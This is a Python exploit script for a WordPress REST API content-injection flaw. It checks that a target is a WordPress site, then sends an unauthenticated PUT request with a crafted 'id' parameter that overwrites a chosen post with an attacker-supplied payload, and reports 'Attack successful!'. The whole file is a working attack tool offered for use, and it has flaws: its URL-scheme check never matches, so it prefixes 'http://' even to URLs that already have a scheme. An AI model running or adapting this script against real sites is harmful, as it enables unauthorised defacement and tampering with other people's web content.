#!/usr/bin/python

import argparse
import json
import logging
import re
import requests

logging.basicConfig(format = '[%(asctime)s] %(levelname)-9s %(message)s')
logger = logging.getLogger('main')

            
def sploit(base_url, article_id, payload, format):

    if base_url[-1]!='/':
        logger.info('Added trailing slash to base URL')
        base_url += '/'

    if not re.match('/^https?:\/\//', base_url):
        logger.info('No URI scheme, defaulting to HTTP')
        base_url = 'http://' + base_url
        
    logger.info('base_url = %s' % base_url)
    logger.info('article_id = %d' % article_id)
    logger.info('raw_payload = %s' % payload)
    
    # Try connection to website
    r = requests.get(base_url)
    if not 'WordPress' in r.text:
        logger.error('Base URL does not seem to be a WordPress URL')
        return
        
        
    # Test REST API
    base_api = base_url + 'wp-json/wp/v2/'
    posts_api = base_api + 'posts/'
    
    r = requests.get(posts_api)
    
    try:
        j = json.loads(r.text)
    except Exception, e:
        logger.error('Could not find suitable API at %s' % base_api)
        return
    
    
    # Test if article exists
    post_url = posts_api + str(article_id)
    r = requests.get(post_url)
    j = json.loads(r.text)
    
    if 'message' in j.keys():
        logger.error('Exception met: %s' % j['message'])
        return
        
    
    # Payload formatting
    if format == 'POST':
        paramlist = payload.split('&')
        body = {}
        
        for param in paramlist:
            name, value = param.split('=', 1)
            body[name] = value
            
    else:
        body = json.loads(payload)

        
    json_payload = json.dumps(body)
    logger.info('json_payload = %s' % json_payload)
    
    
    # Attack!
    target_url = '%s%d?id=%dabc' % (posts_api, article_id, article_id)
    logger.info('Attacking %s' % target_url)
    
    
    r = requests.put(target_url, json=body)
    
    j = json.loads(r.text)
    if 'message' in j.keys():
        logger.error('Exception met during attack: %s' % j['message'])
        return
    
    logger.info('Attack successful!')
    return

    
if __name__=='__main__':

    ap  = argparse.ArgumentParser()
    ap.add_argument('--url', '-u', dest='url', help='Wordpress base url, including URI scheme')
    ap.add_argument('--id', '-i', dest='id', type=int, help='Article id')
    ap.add_argument('--payload', '-p', dest='payload', metavar='P', help='Formatted payload')
    
    formats = ['POST','JSON']
    ap.add_argument('--format', '-f', dest='format', default='POST', metavar='F', help='Format (%s)' % ', '.join(formats))
    
    
    ap.add_argument('-v', action='count', dest='verbose', default=0, help='Increase output verbosity')
    ap.add_argument('-q', action='count', dest='quiet', default=0, help='Make the program quieter')
    
    args = ap.parse_args()
    
    if not args.url or not args.id or not args.payload or args.format not in formats:
        ap.print_help()
        
    verbosityLevel = logging.INFO - 10*(args.verbose) + 10*(args.quiet)
    verbosityLevel = max(logging.DEBUG, verbosityLevel)
    verbosityLevel = min(logging.CRITICAL, verbosityLevel)
    logger.setLevel(verbosityLevel)
        
    sploit(args.url, args.id, args.payload, args.format)